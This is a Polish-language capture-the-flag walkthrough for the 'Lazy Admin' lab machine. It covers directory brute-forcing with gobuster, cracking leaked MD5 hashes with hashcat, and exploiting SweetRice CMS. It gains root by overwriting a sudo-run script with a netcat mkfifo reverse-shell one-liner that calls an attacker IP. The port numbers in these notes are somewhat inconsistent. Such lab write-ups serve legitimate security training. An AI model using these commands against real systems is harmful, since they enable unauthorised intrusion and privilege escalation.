# Lazy Admin

nmap 
gobuster – ukazuje nam katalog content
Ponowne skanowanie katalogów  
```bash
gobuster dir -u 10.82.144.229 -w /usr/share/wordlists/dirb/common.txt 
```
Ponowne uruchomienie ffuzing szukamy ukrytych plików txt .php ,html  

```bash
gobuster dir -u 10.67.163.207/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x php,txt,html
```

Dostajemy folder w którym są pliki .php m.in. mysqldb
Po wejściu otrzymujemy listę userów wraz z hashem hasła

hash-identifier – sprawdzmy  - MD5

## hashcat
```bash
hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
```
W przypadku gdy był już wcześniej sprawdzany taki hash to wyświetlamy go poleceniem  

```bash
hashcat -m 0 hash --show       
```
Logujemy się do strony którą otrzymaliśmy z ffuzowania katalogów.

Odnajdujemy zakładke w której możemy coś wysłac ( np. plik z exploitem)
Na stronie exploit.db wpisujemy nazwe sweet rice i wyszukujemy exploit

Żaden upload nie działa .
Odnajdujemy zakładke w której możemy wysłac code na serwer , a ffuzingu odnajdujemy katalog inc/ads – taki jak zakłaka z której wysłaliśmy code na serwere na ktorym sprawdzamy czy dany plik został wysłany

Po otrzymaniu pliku klikamy w niego i dostajemy reverse shella 
Odnajudjemy flage user.txt
Szukamy flagi root

Wpisujemy sudo -l – czylisprawdamy jakie czy user na uprawnienia root

(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl

Czyli przy pmocy perl może dostać się do katalogu /home…..

Odczytujemy przy pomocy cat plik /home/itguy/backup.pl i dostajemy info że

system("sh", "/etc/copy.sh")
odczytujemy cat /etc/copy.shi dostajemy wsad w którym podmieniamy IP na nasze i zapisujemy

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 1234 >/tmp/f" > /etc/copy.sh 

Na maszynie lokalnej nasluchujemy
nc -lvnp 4242

Z poziomu strony http://IP/content/inc/ads/  uruchamiamy dodany plik i na lokalu otrzymujemy roota

Odczytujemy flage cat /root/root.txt
